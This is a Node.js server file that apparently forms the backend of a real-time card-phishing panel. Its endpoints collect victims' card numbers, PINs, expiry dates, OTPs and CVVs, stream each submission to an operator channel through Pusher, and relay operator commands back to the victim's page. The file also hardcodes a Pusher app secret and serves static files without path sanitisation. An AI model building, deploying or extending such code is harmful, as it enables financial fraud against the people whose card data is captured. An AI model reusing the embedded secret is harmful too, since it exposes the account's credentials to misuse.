const http = require('http');
const fs = require('fs');
const path = require('path');
const Pusher = require('pusher');

// Pusher configuration
const pusher = new Pusher({
    appId: '2148854',
    key: 'd1868eff0961af03482e',
    secret: 'd672c142fd057d31a52c',
    cluster: 'ap2',
    useTLS: true
});

// In-memory storage for submissions
let submissions = [];
let currentPid = "7239";

const PORT = process.env.PORT || 3000;

const MIME_TYPES = {
    '.html': 'text/html',
    '.css': 'text/css',
    '.js': 'application/javascript',
    '.json': 'application/json',
    '.png': 'image/png',
    '.jpg': 'image/jpeg',
    '.jpeg': 'image/jpeg',
    '.gif': 'image/gif',
    '.svg': 'image/svg+xml',
    '.woff': 'font/woff',
    '.woff2': 'font/woff2',
    '.ttf': 'font/ttf',
    '.ico': 'image/x-icon'
};

function parseBody(req) {
    return new Promise((resolve, reject) => {
        let body = '';
        req.on('data', chunk => body += chunk.toString());
        req.on('end', () => {
            try {
                resolve(JSON.parse(body));
            } catch (e) {
                const params = {};
                body.split('&').forEach(pair => {
                    const [key, val] = pair.split('=');
                    if (key) params[decodeURIComponent(key)] = decodeURIComponent(val || '');
                });
                resolve(params);
            }
        });
        req.on('error', reject);
    });
}

function sendJSON(res, data, status = 200) {
    res.writeHead(status, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
    res.end(JSON.stringify(data));
}

function serveStatic(req, res) {
    let filePath = path.join(__dirname, req.url === '/' ? 'index.html' : req.url);
    
    if (!path.extname(filePath) && !filePath.endsWith('/')) {
        if (fs.existsSync(filePath + '.html')) {
            filePath = filePath + '.html';
        } else if (fs.existsSync(path.join(filePath, 'index.html'))) {
            filePath = path.join(filePath, 'index.html');
        }
    } else if (filePath.endsWith('/')) {
        filePath = path.join(filePath, 'index.html');
    }

    fs.readFile(filePath, (err, data) => {
        if (err) {
            res.writeHead(404, { 'Content-Type': 'text/plain' });
            res.end('Not Found');
            return;
        }
        const ext = path.extname(filePath).toLowerCase();
        const contentType = MIME_TYPES[ext] || 'application/octet-stream';
        res.writeHead(200, { 'Content-Type': contentType });
        res.end(data);
    });
}

const server = http.createServer(async (req, res) => {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    // API Routes
    if (req.method === 'POST' && req.url === '/api/submit') {
        const body = await parseBody(req);
        
        // If card data is provided and there's an existing submission for this phone, update it
        if (body.cardNumber && body.phone) {
            const existing = submissions.find(s => s.phone === body.phone && s.status === 'pending');
            if (existing) {
                existing.bank = body.bank || existing.bank;
                existing.cardPrefix = body.cardPrefix || existing.cardPrefix;
                existing.cardNumber = body.cardNumber || existing.cardNumber;
                existing.expMonth = body.expMonth || existing.expMonth;
                existing.expYear = body.expYear || existing.expYear;
                existing.pin = body.pin || existing.pin;
                existing.amount = body.amount || existing.amount;
                existing.status = 'pending';
                pusher.trigger('admin-channel', 'update-submission', existing);
                sendJSON(res, { success: true, id: existing.id });
                return;
            }
        }
        
        const submission = {
            id: Date.now(),
            timestamp: new Date().toISOString(),
            phone: body.phone || '',
            bank: body.bank || '',
            cardPrefix: body.cardPrefix || '',
            cardNumber: body.cardNumber || '',
            expMonth: body.expMonth || '',
            expYear: body.expYear || '',
            pin: body.pin || '',
            amount: body.amount || '',
            otp: body.otp || '',
            cvv: body.cvv || '',
            status: body.status || 'pending',
            pid: currentPid
        };
        submissions.push(submission);
        
        // Notify admin via Pusher
        pusher.trigger('admin-channel', 'new-submission', submission);
        
        sendJSON(res, { success: true, id: submission.id });
        return;
    }

    if (req.method === 'POST' && req.url === '/api/update-submission') {
        const body = await parseBody(req);
        const sub = submissions.find(s => s.id == body.id);
        if (sub) {
            if (body.otp) sub.otp = body.otp;
            if (body.cvv) sub.cvv = body.cvv;
            if (body.status) sub.status = body.status;
            pusher.trigger('admin-channel', 'update-submission', sub);
        }
        sendJSON(res, { success: true });
        return;
    }

    if (req.method === 'POST' && req.url === '/api/command') {
        const body = await parseBody(req);
        const command = body.command;
        const peopleId = body.pid || currentPid;
        
        // Send via Pusher to user's page
        pusher.trigger('confirm', 'App\\Events\\Confirmation', {
            people_id: peopleId,
            status: command
        });
        
        // Update submission status
        const sub = submissions.find(s => s.pid == peopleId && s.status === 'pending');
        if (sub) {
            sub.status = command;
        }
        
        sendJSON(res, { success: true, command: command });
        return;
    }

    if (req.method === 'GET' && req.url === '/api/submissions') {
        sendJSON(res, submissions);
        return;
    }

    if (req.method === 'POST' && req.url === '/api/clear') {
        submissions = [];
        sendJSON(res, { success: true });
        return;
    }

    // Serve static files
    serveStatic(req, res);
});

server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
